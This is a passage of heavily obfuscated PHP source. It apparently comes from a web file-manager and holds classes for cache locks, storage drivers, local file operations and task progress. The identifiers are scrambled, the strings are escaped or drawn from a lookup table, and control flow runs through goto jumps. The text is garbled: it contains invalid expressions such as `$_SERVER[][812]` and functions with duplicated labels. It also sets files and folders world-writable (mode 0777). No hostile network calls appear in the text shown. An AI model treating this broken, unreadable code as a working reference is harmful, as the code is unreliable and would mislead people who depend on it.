foreach ($D襳 as $D) { $c߽ = $this->cachePath . $D; if (strpos($c߽, $fαߏ[808]) && strpos($c߽, $fαߏ[809]) && filemtime($c߽) < time()) { @unlink($c߽); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto c; EϽ騚: if ($c == $f♰[17] && $Cܿ == $f♰[9]) { $c = $f♰[193]; } switch ($c) { case $f♰[800]: self::$handle = new CacheLockRedis(); break; case $f♰[801]: self::$handle = new CacheLockMemcached(); break; case $f♰[17]: self::$handle = new CacheLockDatabase(); break; case $f♰[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto F݅; c: $f♰ =& $_SERVER[]; if (self::$handle) { return self::$handle; } $Aޛ = $GLOBALS[$f♰[6]][$f♰[347]]; goto cƒ; cƒ: self::$timeout = $Aޛ[$f♰[810]] ? $Aޛ[$f♰[810]] : 10; $Cܿ = _get($GLOBALS[$f♰[6]], $f♰[811]); $c = $Aޛ[$f♰[797]] ? $Aޛ[$f♰[797]] : $f♰[193]; goto EϽ騚; F݅: } private static function key($D) { return $_SERVER[][812] . Cache::key($D); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($dӓ = '') { self::$errorMsg = $dӓ; } public static function lockGlobal($e󒼠, $a⪸ݐ) { return self::lock($e󒼠, $a⪸ݐ, !0); } public static function lock($D̈́ᩅ, $F = false, $Ȁ퉷 = false) { goto b; b: $bԡη =& $_SERVER[]; $eߝ = self::init(); $d腽ξ = self::key($D̈́ᩅ); goto b; b: $F = $F ? $F : self::$timeout; $Fߊ = $eߝ->lock($d腽ξ, $F); if (!$Fߊ) { $B믜Ƿ = "\x6c\157\143\153\x20\x65\x72\162\x6f\162\73\x6b\x65\x79\75{$D̈́ᩅ}\x3b\x74\151\x6d\145\75{$F}\x3b" . self::$errorMsg . $bԡη[68] . get_caller_msg(); $dƂ = LNG($bԡη[813]) . "\50{$F}\163\51\56" . LNG($bԡη[814]); $dƂ .= $bԡη[815]; if (is_string(self::$errorMsg) && self::$errorMsg) { $dƂ = $dƂ . $bԡη[816] . self::$errorMsg; } write_log($B믜Ƿ, $bԡη[817]); show_json($dƂ, !1); } goto aÊ; aÊ: if (!$Ȁ퉷) { self::$lockItem[$d腽ξ] = !0; } return $Fߊ; goto b̔; b̔: } public static function lockGet($BԸ) { $e۔ = self::key($BԸ); if (self::$lockItem[$e۔]) { return self::$lockItem[$e۔]; } return self::init()->lockGet($e۔); } public static function unlock($dؒ) { $D = self::key($dؒ); self::$lockItem[$D] = null; return self::init()->unlock($D); } public static function unlockRuntime() { $Fޘ =& $_SERVER[]; $aȏ = self::init(); $c = !1; foreach (self::$lockItem as $Aӗ => $aḫ) { if (!$aḫ) { continue; } $aȏ->unlock($Aӗ); if (!$c) { $c = !0; write_log($Fޘ[818] . $Aӗ . $Fޘ[68] . get_caller_msg(), $Fޘ[817]); continue; } write_log($Fޘ[818] . $Aӗ, $Fޘ[817]); } self::fileUnlockAll(); } public static function fileLock($D) { goto FɬÚ; cˬ: $DǤ = fopen(DATA_PATH . $D . $dЭݺ[820], $dЭݺ[821]); if (!$DǤ) { return !1; } $GLOBALS[$dЭݺ[819]][$D] = $DǤ; goto F۴ˍ; FɬÚ: $dЭݺ =& $_SERVER[]; if (!$GLOBALS[$dЭݺ[819]]) { $GLOBALS[$dЭݺ[819]] = array(); } $GLOBALS[$dЭݺ[819]][$D] = !1; goto cˬ; A: return !1; goto f; F۴ˍ: if (flock($DǤ, LOCK_EX)) { return !0; } self::unlock($D); show_json($dЭݺ[822], !1); goto A; f: } public static function fileUnlock($Főʟ) { $dњܽ =& $_SERVER[]; $B̷ = $GLOBALS[$dњܽ[819]][$Főʟ]; if (!$B̷) { return; } $GLOBALS[$dњܽ[819]][$Főʟ] = !1; flock($B̷, LOCK_UN); fclose($B̷); } public static function fileUnlockAll() { $aܞὑ۬ =& $_SERVER[]; if (!$GLOBALS[$aܞὑ۬[819]]) { return; } foreach ($GLOBALS[$aܞὑ۬[819]] as $Cۻק => $E𕗃) { if (!$E𕗃) { continue; } $GLOBALS[$aܞὑ۬[819]][$Cۻק] = !1; flock($E𕗃, LOCK_UN); fclose($E𕗃); } $GLOBALS[$aܞὑ۬[819]] = array(); } } goto a; C엯㣂: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\163\x6f\x75\x72\143\x65\x53\145\143\x72\145\x74\114\151\163\164"; public $field = array("\163\x6f\165\x72\143\145\111\104", "\164\x79\160\145\111\104", "\x63\x72\145\141\x74\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\163\164\157\x72\141\x67\145\114\151\163\164"; public $field = array("\156\x61\x6d\x65", "\163\x69\172\145\x4d\x61\x78", "\x73\x79\x73\x74\x65\x6d", "\x64\x65\x66\x61\165\154\164", "\x64\162\x69\166\145\x72", "\x63\x6f\x6e\x66\x69\x67"); public function listData($bݝ = false, $cÞ񬸋 = "\155\x6f\x64\151\x66\171\x54\151\155\x65", $d􄵍ʺ = false) { $c䨂 =& $_SERVER[]; $bκ = parent::listData($bݝ, $cÞ񬸋, $d􄵍ʺ); if ($bݝ) { return $bκ; } $a = $this->ioSizeUseGet(array_to_keyvalue($bκ, $c䨂[33], $c䨂[393])); foreach ($bκ as $E簮 => $dڬ) { unset($bκ[$E簮][$c䨂[6]]); $bκ[$E簮][$c䨂[1688]] = isset($a[$dڬ[$c䨂[393]]]) ? $a[$dڬ[$c䨂[393]]] : 0; } return $bκ; } public function ioSizeUseGet($EӚӤ) { goto Cчу; Dܫ: Cache::set($Eڟ, $Eﴉ, 600); return $Eﴉ; goto cǦ; Cчу: $Bђ =& $_SERVER[]; if (!$EӚӤ) { return array(); } $Eڟ = $Bђ[2000] . implode($Bђ[47], $EӚӤ); goto eЎ; eЎ: $Eﴉ = Cache::get($Eڟ); if ($Eﴉ) { return $Eﴉ; } $C茐 = array($Bђ[787] => $Bђ[393], $Bђ[2001] => $Bђ[78]); goto eʃ; eʃ: $c튿 = array($Bђ[787] => array($Bђ[7], $EӚӤ)); $Eﴉ = Model($Bђ[752])->field($C茐)->where($c튿)->group($Bђ[787])->select(); $Eﴉ = array_to_keyvalue($Eﴉ, $Bђ[393], $Bђ[78]); goto Dܫ; cǦ: } public function getConfig($D꼧) { $F􂭌 = parent::listData($D꼧); return json_decode($F􂭌[$_SERVER[][6]], !0); } public function update($A, $cӖ) { goto E¸; e唑: if (isset($aÈݼ[$E]) && $aÈݼ[$E][$AɃύ[393]] != $A) { return !1; } if (isset($cӖ[$AɃύ[2002]]) && $cӖ[$AɃύ[2002]] == $AɃύ[87]) { $this->checkConfig($cӖ); } unset($cӖ[$AɃύ[2002]]); goto cȬ; cȬ: $fݦߝ = parent::update($A, $cӖ); if ($fݦߝ && $cӖ[$AɃύ[34]]) { foreach ($aÈݼ as $dїͩ) { if ($dїͩ[$AɃύ[34]] && $dїͩ[$AɃύ[393]] != $A) { parent::update($dїͩ[$AɃύ[393]], array($AɃύ[34] => 0)); } } } return $fݦߝ; goto f֑ﺏ; E¸: $AɃύ =& $_SERVER[]; $E = $cӖ[$AɃύ[28]]; $aÈݼ = array_to_keyvalue(parent::listData(), $AɃύ[28]); goto e唑; f֑ﺏ: } public function add($A˴) { goto E; A͇: $this->checkConfig($A˴); $aȳ = parent::insert($A˴); if ($aȳ && $A˴[$E㋓[34]]) { foreach ($BԤ as $eĥڋ) { if ($eĥڋ[$E㋓[34]]) { parent::update($eĥڋ[$E㋓[393]], array($E㋓[34] => 0)); } } } goto CϏ; CϏ: return $aȳ; goto a冻; E: $E㋓ =& $_SERVER[]; $BԤ = array_to_keyvalue(parent::listData(), $E㋓[28]); if (isset($BԤ[$A˴[$E㋓[28]]])) { return !1; } goto A͇; a冻: } public function checkConfig(&$A, $aϯֻ֣ = false) { goto B»; c͍: foreach ($A as $Eӱ => $cƌ) { $A[$Eӱ] = trim($cƌ); } $A[$B[2003]] = rand_string(6); $f = $GLOBALS[$B[6]][$B[88]][$B[796]]; goto b̓; D: $AȎ³ = $c->getPath($Bз . $B[1141]); if (!$c->mkfile($AȎ³)) { if ($aϯֻ֣) { return LNG($B[2007]); } show_json(LNG($B[2007]), !1); } $A[$B[1077]] = $Bз; goto F쩄; b̓: $f = isset($f[$A]) ? $f[$A] : ucfirst($A); $Bۜ = $B[72] . $f; if (!$f || !class_exists($Bۜ)) { if ($aϯֻ֣) { return LNG($B[2004]); } write_log(array($B[2005], $A, get_caller_info()), $B[2006]); show_json(LNG($B[2004]), !1, $A); } goto C; B»: $B =& $_SERVER[]; $A = strtolower($A[$B[94]]); $A = json_decode($A[$B[6]], !0); goto c͍; C: $c = new $Bۜ($A); if (in_array($A, $c->objectDriver)) { if (!$c->isBucketCors() && !$c->setBucketCors()) { $Aѽ = LNG($B[2007]); $Aѽ .= $B[2008] . LNG($B[2009]); if ($aϯֻ֣) { return $Aѽ; } show_json($Aѽ, !1); } } $Bз = rtrim($A[$B[1077]], $B[8]) . $B[8]; goto D; F쩄: $A[$B[6]] = json_encode($A); $A[$B[94]] = $f; return !0; goto f͝; f͝: } public function driverListSystem() { $AХ =& $_SERVER[]; $DÂ = parent::listData(); $b頗 = array(); foreach ($DÂ as $C٨Ѕ) { unset($C٨Ѕ[$AХ[194]], $C٨Ѕ[$AХ[84]]); $C٨Ѕ[$AХ[6]] = json_decode($C٨Ѕ[$AХ[6]], !0); $b頗[] = $C٨Ѕ; } return $b頗; } public function defaultDriver() { $BԈ׶ =& $_SERVER[]; $cŉ = parent::listData(); $B = array_filter_by_field($cŉ, $BԈ׶[34], 1); $B = $B[0]; if ($B) { $B[$BԈ׶[6]] = json_decode($B[$BԈ׶[6]], !0); } return $B; } public function driverInfo($AԺ) { $a՚ =& $_SERVER[]; $Dԉ = array_to_keyvalue(parent::listData(), $a՚[393]); if (!isset($Dԉ[$AԺ])) { return !1; } $BŇ = $Dԉ[$AԺ]; $BŇ[$a՚[6]] = json_decode($BŇ[$a՚[6]], !0); return $BŇ; } public function remove($CҦ) { $this->removeShareItems($CҦ); return parent::remove($CҦ); } public function removeWithFile($fĴߋ, $F) { goto bݯ; cƋ: $Dѩ->task[$eɫ[728]] = (double) $e훭; $c˩ = KodIO::defaultDriver(); $Dȵ = $c˩[$eɫ[393]]; goto B; DɊ: $C֋ڗ = Model($eɫ[193])->where($Eߔ)->field($eɫ[2012])->select(); foreach ($C֋ڗ as $d) { goto dЈ斟; d: if (IO::exist($cꥒ)) { $Dѩ->updateFileEnd($d[$eɫ[28]], $d[$eɫ[78]]); continue; } if (!IO::move($d, get_path_father($cꥒ))) { $E = !1; break; } $Eߔ = array($eɫ[447] => $d[$eɫ[447]]); goto A; A: $F = array($eɫ[787] => $Dȵ, $eɫ[76] => $cꥒ); Model($eɫ[193])->where($Eߔ)->save($F); goto Cʚ; dЈ斟: $d = $d[$eɫ[76]]; $cꥒ = $cȑ҃ݡ . str_replace("\x7b\x69\x6f\x3a{$fĴߋ}\175\57", $eɫ[33], $d); if (!IO::exist($d)) { $Dз[] = $d[$eɫ[447]]; $Dѩ->updateFileEnd($d[$eɫ[28]], $d[$eɫ[78]]); continue; } goto d; Cʚ: } $this->removeByFileID($Dз); goto dȲǇ; B: $cȑ҃ݡ = "\173\x69\157\x3a{$Dȵ}\175\57"; $E = !0; $Dз = array(); goto DɊ; bƴ: $e훭 = Model($eɫ[450])->where($Eߔ)->sum($eɫ[78]); $eд͏ = $F . $eɫ[2010] . $fĴߋ; $Dѩ = new TaskFileTransfer($eд͏, $eɫ[2006], $A, LNG($eɫ[2011]) . "\x28{$fĴߋ}\51"); goto cƋ; bݯ: $eɫ =& $_SERVER[]; $Eߔ = array($eɫ[787] => $fĴߋ); $A = Model($eɫ[450])->where($Eߔ)->count(); goto bƴ; dȲǇ: if (!$E) { $Dѩ->stop($eд͏); return !1; } $Dѩ->end(); if ($F == $eɫ[1668]) { $this->remove($fĴߋ); } goto e; e: } public function progress($AԘ, $f) { return Task::get($f . $_SERVER[][2010] . $AԘ); } private function removeByFileID($aƉ = array()) { goto F꽟; F꽟: $A =& $_SERVER[]; if (empty($aƉ)) { return; } $B = array($A[447] => array($A[7], $aƉ)); goto c; c: $AݼՍ = Model($A[1209])->where($B)->field($A[395])->select(); if (!$AݼՍ) { return; } $AݼՍ = array_to_keyvalue($AݼՍ, $A[33], $A[395]); goto b; b: foreach ($AݼՍ as $B) { Model($A[409])->removeNow($B, !1); } goto b; b: } private function removeShareItems($FԷ) { goto e; e: $Ȩ =& $_SERVER[]; $d߶ = "\x7b\x69\x6f\72{$FԷ}\175\x2f"; $aՓ = array($Ȩ[395] => 0, $Ȩ[1072] => array($Ȩ[380], "{$d߶}\x25")); goto Eȸ; B㟸: Model($Ȩ[576])->remove($b); goto Cσث; Eȸ: $F = Model($Ȩ[1679])->where($aՓ)->field($Ȩ[468])->select(); if (empty($F)) { return; } $b = array_to_keyvalue($F, $Ȩ[33], $Ȩ[468]); goto B㟸; Cσث: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x4c\x69\147\150\x74\x41\x70\x70"; public $modelType = "\123\x79\163\x74\145\x6d\117\160\x74\151\x6f\156"; public $field = array("\156\x61\155\x65", "\x67\162\157\165\160", "\144\x65\x73\143", "\x63\157\x6e\164\x65\156\x74"); public function listData($Fσ = false, $e = "\155\x6f\144\x69\146\171\124\151\x6d\x65", $a = true) { return parent::listData($Fσ, $e, $a); } public function remove($Fї) { $d܋ƅî = $this->findByName($Fї); if (!$d܋ƅî) { return !1; } return parent::remove($d܋ƅî[$_SERVER[][393]]); } public function add($C݄) { if ($this->findByName($C݄[$_SERVER[][28]])) { return !1; } return parent::insert($C݄); } public function update($bĻ堽, $eߝĸ) { $Aڪ뜩 =& $_SERVER[]; $f = $this->findByName($bĻ堽); $AƼ = $this->findByName($eߝĸ[$Aڪ뜩[28]]); if (!$f || $AƼ && $AƼ[$Aڪ뜩[393]] != $f[$Aڪ뜩[393]]) { return !1; } return parent::update($f[$Aڪ뜩[393]], $eߝĸ); } } goto e͒; CĲ׍: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($DЯ) { if (substr($DЯ, 0, 2) == $_SERVER[][1248]) { $DЯ = BASIC_PATH . substr($DЯ, 2); } return $DЯ; } public function iconvApp($b㪺) { $ç =& $_SERVER[]; global $config; return $this->iconvTo($b㪺, $config[$ç[1246]], $config[$ç[1245]]); } public function iconvSystem($F󟐨) { $CϏ =& $_SERVER[]; global $config; return $this->iconvTo($F󟐨, $config[$CϏ[1245]], $config[$CϏ[1246]]); } public function getPathOuter($c) { goto D; D: $c = KodIO::clear($c); $c = substr($c, strlen($aۉ)); if (empty($this->pathDriver)) { return $c; } goto AҮ; A׎: if (substr($aۉ, 0, 2) == $c[1248]) { $aۉ = BASIC_PATH . substr($aۉ, 2); } if (substr($c, 0, 2) == $c[1248]) { $c = BASIC_PATH . substr($c, 2); } $aۉ = KodIO::clear($aۉ); goto D; AҮ: return $this->pathDriver . $c[8] . ltrim($c, $c[8]); goto Cƙ; D: $c =& $_SERVER[]; $aۉ = $this->iconvApp($this->pathBase); $c = $this->iconvApp($c); goto A׎; Cƙ: } public function mkfile($E願, $D셉 = '', $aʖ = REPEAT_RENAME) { $E願 = $this->iconvSystem($E願); @touch($E願); if ($D셉) { file_put_contents($E願, $D셉); } @chmod($E願, 511); return is_file($E願) ? $this->getPathOuter($E願) : !1; } public function mkdir($c, $F = REPEAT_SKIP) { $c = $this->iconvSystem($c); if (is_dir($c)) { return $this->getPathOuter($c); } @mkdir($c, 511, !0); @chmod($c, 511); return is_dir($c) ? $this->getPathOuter($c) : !1; } public function copyFile($c׬, $e) { $this->mkdir($this->pathFather($e)); $c׬ = $this->iconvSystem($c׬); $e = $this->iconvSystem($e); $eш = copy_64($c׬, $e); @chmod($e, 511); return $eш ? $this->getPathOuter($e) : !1; } public function moveFile($eɿ, $B͍) { goto C; Cܜ: return $c ? $this->getPathOuter($B͍) : !1; goto b; C: $this->mkdir($this->pathFather($B͍)); $eɿ = $this->iconvSystem($eɿ); $B͍ = $this->iconvSystem($B͍); goto c鱇; c鱇: $c = intval(@rename($eɿ, $B͍)); if (!$c) { if ($c = intval(@copy_64($eɿ, $B͍))) { @unlink($eɿ); } } @chmod($B͍, 511); goto Cܜ; b: } public function delFile($B犸) { $B犸 = $this->iconvSystem($B犸); if (!@unlink($B犸)) { @chmod($B犸, 511); if (!@unlink($B犸)) { return !1; } } else { return !0; } } public function delFolder($AŌ) { goto aڨ; FԜ: return rmdir($AŌ); goto B; E۾: if (!($b܂ = opendir($AŌ))) { return !1; } while (($bλѼ = readdir($b܂)) !== !1) { if ($bλѼ == $DΫɥ[95] || $bλѼ == $DΫɥ[1255]) { continue; } $F = $AŌ . $DΫɥ[8] . $bλѼ; if (is_file($F) || is_link($F)) { if (!unlink($F)) { chmod($F, 511); if (!unlink($F)) { return !1; } } } else { if (is_dir($F)) { chmod($F, 511); $F = $this->iconvApp($F); if (!$this->delFolder($F)) { return !1; } } } } closedir($b܂); goto FԜ; aڨ: $DΫɥ =& $_SERVER[]; $AŌ = $this->iconvSystem($AŌ); if (!is_dir($AŌ)) { return !0; } goto E۾; B: } public function rename($f, $fݮ) { goto A; A: $F׋ =& $_SERVER[]; $Eߊɯ = $this->fileNameAuto($this->pathFather($f), $fݮ); $Eߊɯ = $this->iconvSystem($Eߊɯ); goto Bȝ; Bȝ: $f = $this->iconvSystem($f); $Cʺ = $this->pathFather($f); $D衑 = rtrim($Cʺ, $F׋[8]) . $F׋[8] . $Eߊɯ; goto Cإ; Cإ: $Bڞ = @rename($f, $D衑); $D衑 = $this->iconvApp($D衑); return $Bڞ ? $this->getPathOuter($D衑) : !1; goto C敩; C敩: } public function size($bҽ) { $bҽ = $this->iconvSystem($bҽ); return filesize_64($bҽ); } public function info($bܡ) { $bܡ = $this->iconvSystem($bܡ); if ($this->isFolder($bܡ)) { return $this->folderInfo($bܡ); } else { if ($this->isFile($bܡ)) { return $this->fileInfo($bܡ); } } return !1; } protected function infoChildren($C, &$E禂, $c槷 = true) { goto C; a˘: closedir($Fⷣ); goto fʎ; C: $eމ =& $_SERVER[]; check_abort_echo(); $C = rtrim($C, $eމ[8]) . $eމ[8]; goto Ěܯʢ; Ěܯʢ: if ($c槷) { $C = $this->iconvSystem($C); } if (!($Fⷣ = @opendir($C))) { return; } while (($cӱ = readdir($Fⷣ)) !== !1) { if ($cӱ == $eމ[95] || $cӱ == $eމ[1255]) { continue; } $b܌ = $C . $cӱ; if (is_file($b܌) || is_link($b܌)) { $E禂[$eމ[79]]++; $E禂[$eމ[78]] += filesize_64($b܌); } else { if (is_dir($b܌)) { $E禂[$eމ[80]]++; $this->infoChildren($b܌, $E禂, !1); } } } goto a˘; fʎ: } private function folderInfo($bёǗ, $Eƌ = false) { $Fȣ =& $_SERVER[]; $bёǗ = rtrim($bёǗ, $Fȣ[8]) . $Fȣ[8]; $B = $this->iconvApp($this->pathThis($bёǗ)); if ($Eƌ) { return array($Fȣ[28] => $B, $Fȣ[76] => $this->getPathOuter($bёǗ), $Fȣ[29] => $Fȣ[77]); } $CⵙÙ = array($Fȣ[28] => $B, $Fȣ[76] => $this->getPathOuter($bёǗ), $Fȣ[29] => $Fȣ[77], $Fȣ[194] => @filectime($bёǗ), $Fȣ[84] => @filemtime($bёǗ), $Fȣ[1258] => @fileatime($bёǗ), $Fȣ[1259] => is_readable($bёǗ), $Fȣ[1260] => is_writable($bёǗ), $Fȣ[1261] => get_mode($bёǗ)); return $CⵙÙ; } private function fileInfo($B۱, $b = false) { $E =& $_SERVER[]; $c䗴 = $this->iconvApp($this->pathThis($B۱)); if ($b) { return array($E[28] => $c䗴, $E[76] => $this->getPathOuter($B۱), $E[29] => $E[193], $E[78] => $this->size($B۱), $E[168] => $this->ext($c䗴)); } $Fƅ = array($E[28] => $c䗴, $E[76] => $this->getPathOuter($B۱), $E[29] => $E[193], $E[194] => @filectime($B۱), $E[84] => @filemtime($B۱), $E[1258] => @fileatime($B۱), $E[78] => $this->size($B۱), $E[168] => $this->ext($c䗴), $E[1259] => is_readable($B۱), $E[1260] => is_writable($B۱), $E[1261] => get_mode($B۱)); return $Fƅ; } public function exist($e) { $e = $this->iconvSystem($e); return @file_exists($e); } public function isFile($eȏ) { $eȏ = $this->iconvSystem($eȏ); return @is_file($eȏ); } public function isFolder($C) { $C = $this->iconvSystem($C); return @is_dir($C); } public function listPath($c̤ʒ, $B䅻 = false) { goto C; aƮ: closedir($A); return $F; goto C; C: $b՟ =& $_SERVER[]; $c̤ʒ = $this->iconvSystem($c̤ʒ); $c̤ʒ = rtrim($c̤ʒ, $b՟[8]) . $b՟[8]; goto C톋; C톋: $F = array($b՟[75] => array(), $b՟[74] => array()); if (!($A = @opendir($c̤ʒ))) { return $F; } while (($C = readdir($A)) !== !1) { if ($C == $b՟[95] || $C == $b՟[1255]) { continue; } $E񊛃Ԇ = $c̤ʒ . $C; if (is_file($E񊛃Ԇ)) { $F[$b՟[74]][] = $this->fileInfo($E񊛃Ԇ, $B䅻); } else { $F[$b՟[75]][] = $this->folderInfo($E񊛃Ԇ, $B䅻); } } goto aƮ; C: } public function listAll($Fٹˉ, &$f = array()) { goto B; B: $bɊ =& $_SERVER[]; $Fٹˉ = $this->iconvSystem($Fٹˉ); $Fٹˉ = rtrim($Fٹˉ, $bɊ[8]) . $bɊ[8]; goto eľѢϢ; eľѢϢ: if (!($F䨠֥ = @opendir($Fٹˉ))) { return $f; } while (($c悹҄ = readdir($F䨠֥)) !== !1) { if ($c悹҄ == $bɊ[95] || $c悹҄ == $bɊ[1255]) { continue; } $b֋ = $Fٹˉ . $c悹҄; if (is_dir($b֋) && !is_link($b֋)) { $f[] = array($bɊ[76] => $b֋ . $bɊ[8], $bɊ[77] => 1, $bɊ[84] => @filemtime($b֋), $bɊ[78] => 0); $this->listAll($b֋, $f); } else { $f[] = array($bɊ[76] => $b֋, $bɊ[77] => 0, $bɊ[84] => @filemtime($b֋), $bɊ[78] => $this->size($b֋)); } } closedir($F䨠֥); goto EӉ; EӉ: return $f; goto EςӢ; EςӢ: } public function has($cॐ, $e = false, $c©л = true) { goto c͵ӄ; c͵ӄ: $f =& $_SERVER[]; $cॐ = $this->iconvSystem($cॐ); $cॐ = rtrim($cॐ, $f[8]) . $f[8]; goto b; Bō: $dꃸ = 0; while (($f̴ڗ = readdir($Cł)) !== !1) { if ($f̴ڗ == $f[95] || $f̴ڗ == $f[1255]) { continue; } $D = $cॐ . $f̴ڗ; if ($e) { $dꃸ++; if (@is_file($D)) { $C擊++; } else { $Eۥ++; } if ($dꃸ > 10000) { break; } continue; } if ($c©л) { if (@is_file($D)) { return !0; } } else { if (@is_dir($D . $f[8])) { return !0; } } } closedir($Cł); goto fث١; b: if (!($Cł = @opendir($cॐ))) { return !1; } $C擊 = 0; $Eۥ = 0; goto Bō; fث١: if ($e) { return array($f[203] => $C擊, $f[204] => $Eۥ); } return !1; goto f; f: } public function hashSimple($aԗ) { goto Eاƈσ; Eاƈσ: $Eμ =& $_SERVER[]; if (!$aԗ) { return md5($Eμ[33]); } $aԗ = $this->iconvSystem($aԗ); goto C㹾߾; aĈ: return md5($Eߋ) . $a; goto dꆌ; fχ: fseek_64($E˰, $a - $c); $Eߋ .= fread($E˰, $c); fclose($E˰); goto aĈ; C㹾߾: $a = $this->size($aԗ); $c = 200; $F = 50; goto a; Eמ: $E˰ = fopen($aԗ, $Eμ[1262]); if (!$E˰) { return $Eߋ; } for ($A = 0; $A < $F; $A++) { fseek_64($E˰, $B܌ * $A); $Eߋ .= fread($E˰, $c); } goto fχ; a: if ($a <= $c * $F) { return $this->hashMd5($aԗ) . $a; } $Eߋ = $Eμ[33]; $B܌ = intval($a / $F); goto Eמ; dꆌ: } public function getContent($d޿) { $d޿ = $this->iconvSystem($d޿); return file_get_contents($d޿); } public function setContent($E, $Eԏ = '') { $E = $this->iconvSystem($E); $a = @file_put_contents($E, $Eԏ, LOCK_EX); clearstatcache(); @chmod($E, 511); return $a === !1 ? !1 : !0; } public function fileSubstr($d, $B = 0, $a = false) { goto FƏ; FƏ: $fˊ =& $_SERVER[]; $d = $this->iconvSystem($d); if ($a === !1) { $a = $this->size($d); } goto cٯ; cٯ: if ($a <= 0) { return $fˊ[33]; } $EĒ = fopen($d, $fˊ[1262]); if (!$EĒ) { return !1; } goto Eʔ; Eʔ: fseek_64($EĒ, $B); $A = fread($EĒ, $a); fclose($EĒ); goto cᠻ; cᠻ: return $A; goto f; f: } public function upload($c, $a쳉, $C = false, $cۂ = REPEAT_REPLACE) { if ($C) { return $this->moveFile($a쳉, $c); } return $this->copyFile($a쳉, $c); } public function setModifyTime($c, $Dه = '') { @touch($c, intval($Dه)); } public function download($dɅ癝, $d) { return $this->iconvSystem($dɅ癝); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($c⌡) { parent::__construct($c⌡); $this->signatureVersion($_SERVER[][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($e϶) { parent::__construct($e϶); $this->signatureVersion($_SERVER[][212]); } public function fileOutLink($EĂ) { $Cҧڭ =& $_SERVER[]; if (substr($EĂ, 0, 7) == $Cҧڭ[1207]) { $EĂ = $Cҧڭ[1208] . substr($EĂ, 7); } header($Cҧڭ[159] . $EĂ); die; } } goto eԉĕ; Fϡ: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($D, $b = '', $A̓ = 0, $e = '') { goto C; C: $c˘ =& $_SERVER[]; if (self::get($D)) { return; } $this->task = array($c˘[393] => $D, $c˘[1533] => USER_ID, $c˘[1436] => $e, $c˘[29] => $b, $c˘[1024] => $c˘[33], $c˘[1022] => $A̓, $c˘[1037] => 0, $c˘[1534] => 0, $c˘[1535] => 0, $c˘[754] => timeFloat(), $c˘[753] => 0, $c˘[1536] => 0, $c˘[1537] => 0, $c˘[1538] => 0, $c˘[715] => $c˘[1496]); goto A; A: $GLOBALS[$c˘[1539]] = 1; Hook::bind($c˘[1498], array($this, $c˘[1540])); Hook::bind($c˘[1541], array($this, $c˘[1542])); goto dʈ; dʈ: $this->startAfter(); Hook::trigger($c˘[1543], $this->task); $this->task[$c˘[1536]] = timeFloat(); goto bȋ; bȋ: } public function end() { goto e; e: $cÃ =& $_SERVER[]; if (!$this->task) { return; } if ($this->task[$cÃ[1536]]) { self::valueSet($this->task[$cÃ[393]], !1); } goto dʍ; eƇ: Hook::unbind($cÃ[1541], array($this, $cÃ[1542])); $this->endAfter(); $this->task = !1; goto D; dʍ: $A = timeFloat() - $this->task[$cÃ[754]]; self::log($cÃ[1544] . $this->task[$cÃ[393]] . $cÃ[1545] . $A . $cÃ[1546]); Hook::unbind($cÃ[1498], array($this, $cÃ[1540])); goto eƇ; D: } public function update($a = 0, $A = false) { goto c; FΑ: Hook::trigger($C[1550], $Aư); self::valueSet($Aư[$C[393]], $Aư); goto cďֆ; b: $dМ = self::get($Aư[$C[393]]); $C˱ = $dМ[$C[715]]; if ($C˱ == self::STATYS_KILL) { $B = array($C[1547] => LNG($C[1548]), $C[1089] => !1); Cache::set($C[1549] . $this->task[$C[393]], $B, 30); $this->onKill(); $this->end(); die; } else { if ($C˱ == self::STATYS_STOP) { $dϵ = 2; $dМ[$C[1537]] += $dϵ; self::valueSet($Aư[$C[393]], $dМ); sleep($dϵ); $this->update(); return; } } goto Fݡ; c: $C =& $_SERVER[]; $Aư =& $this->task; if (!$Aư) { return; } goto Dȟ; Fݡ: $Aư[$C[715]] = $C˱ ? $C˱ : $Aư[$C[715]]; $Aư[$C[1537]] = $dМ[$C[1537]] ? $dМ[$C[1537]] : 0; $Aư[$C[1536]] = timeFloat(); goto FΑ; Dȟ: $Aư[$C[1037]] += $a; $Aư[$C[753]] = timeFloat(); if ($Aư[$C[1022]]) { if ($Aư[$C[1022]] < $Aư[$C[1037]]) { $Aư[$C[1022]] = $Aư[$C[1037]]; } $D = timeFloat() - $Aư[$C[754]] - $Aư[$C[1537]]; $Aư[$C[1534]] = $Aư[$C[1037]] / $Aư[$C[1022]]; $Aư[$C[1535]] = $Aư[$C[1037]] / $D; if ($Aư[$C[1534]] > 0) { $Aư[$C[1538]] = $D * (1 - $Aư[$C[1534]]) / $Aư[$C[1534]]; } $Aư[$C[1538]] = $Aư[$C[1538]] <= 0 ? 0 : $Aư[$C[1538]]; } goto a; a: $this->updateAfter(); $e؉ = 0.2; if (timeFloat() - $Aư[$C[1536]] < $e؉ && !$A) { return; } goto b; cďֆ: } public function onKillSet($E륣, $E = array()) { $this->onKillCall = array($E륣, $E); } public function onKill() { $Eޖ =& $_SERVER[]; self::log($Eޖ[1544] . $this->task[$Eޖ[393]] . $Eޖ[1551]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($c) { $aˇ =& $_SERVER[]; Cache::set($aˇ[1549] . $this->task[$aˇ[393]], $c, 60); return $c; } public static function get($B) { $Dĺ =& $_SERVER[]; $Bߢ = self::valueGet($B); if (is_array($Bߢ) && $Bߢ[$Dĺ[1552]]) { $d狃 = ActionApply($Bߢ[$Dĺ[1552]], array($Bߢ)); $Bߢ = is_array($d狃) ? $d狃 : $Bߢ; } 